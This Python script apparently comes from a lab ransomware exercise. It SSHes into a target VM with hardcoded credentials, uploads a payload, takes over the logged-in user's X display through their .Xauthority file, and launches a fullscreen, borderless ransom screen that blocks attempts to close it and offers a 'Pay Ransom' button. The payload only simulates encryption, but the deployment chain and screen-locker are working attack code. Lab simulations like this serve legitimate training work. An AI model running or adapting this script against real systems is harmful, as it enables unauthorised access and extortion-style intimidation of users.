#!/usr/bin/env python3
import sys
import paramiko
import time

# --- LAB CREDENTIALS ---
TARGET_IP = "172.16.1.100" # The hardened Kali VM
USERNAME = "CEO"
PASSWORD = "CEOPass123!"

def main():
    print(f"[*] Preparing to deploy payload to hardened target {TARGET_IP}...")

    # We use Tkinter for the GUI because it is built into Python by default
    payload_script = """#!/usr/bin/env python3
import tkinter as tk
import sys
import time

def pay_ransom():
    lbl.config(text="Decrypting...")
    root.update()
    for i in range(0, 101, 10):
        lbl.config(text=f"Decrypting your files... {i}%")
        root.update()
        time.sleep(0.2)
    root.destroy()

root = tk.Tk()
# Force it to be always on top and fullscreen
root.attributes('-fullscreen', True)
root.attributes('-topmost', True) 
root.configure(background='black')
root.overrideredirect(True) # Removes window borders/close buttons

lbl = tk.Label(root, text="Your Kali files have been simulated-encrypted!\\nClick below to end.", 
               fg="lime", bg="black", font=("Courier", 30, "bold"))
lbl.pack(expand=True)

btn = tk.Button(root, text="Pay Ransom", command=pay_ransom, 
                bg="darkred", fg="white", font=("Courier", 20, "bold"))
btn.pack(side="bottom", pady=50)

# Attempt to block ALT+F4
root.protocol("WM_DELETE_WINDOW", lambda: None)
root.mainloop()
"""

    try:
        # 1. Connect to the Hardened Kali VM via SSH
        print("[*] Connecting via SSH...")
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        ssh.connect(TARGET_IP, username=USERNAME, password=PASSWORD)
        
        # 2. Upload the payload script
        print("[*] Uploading payload to /tmp/ransom_sim.py...")
        sftp = ssh.open_sftp()
        with sftp.file('/tmp/ransom_sim.py', 'w') as f:
            f.write(payload_script)
        ssh.exec_command("chmod +x /tmp/ransom_sim.py")
        sftp.close()

        # 3. Execute the payload on the active display
        print("[*] Triggering GUI on active display...")
        
        # We need to find the active display (usually :0 or :1)
        find_display_cmd = "who | grep -m 1 '(:[0-9])' | awk '{print $2}'"
        stdin, stdout, stderr = ssh.exec_command(find_display_cmd)
        display = stdout.read().decode().strip()
        
        if not display:
            print("[-] Could not find an active desktop session (is the CEO user logged into the GUI?).")
            ssh.close()
            sys.exit(1)
            
        print(f"[+] Found active display: {display}")

        # 4. Execute the payload
        # Note: If the Kali VM is hardened, XAUTHORITY permissions might block this.
        # We attempt to use the CEO user's XAUTHORITY.
        exec_cmd = (
            f"export DISPLAY={display}; "
            f"export XAUTHORITY=/home/{USERNAME}/.Xauthority; "
            f"nohup python3 /tmp/ransom_sim.py > /dev/null 2>&1 &"
        )
        
        ssh.exec_command(exec_cmd)
        
        print("[+] Attack simulation launched. Check the Hardened Kali VM screen!")
        ssh.close()

    except paramiko.AuthenticationException:
        print("[-] Authentication failed. Check your credentials.")
    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
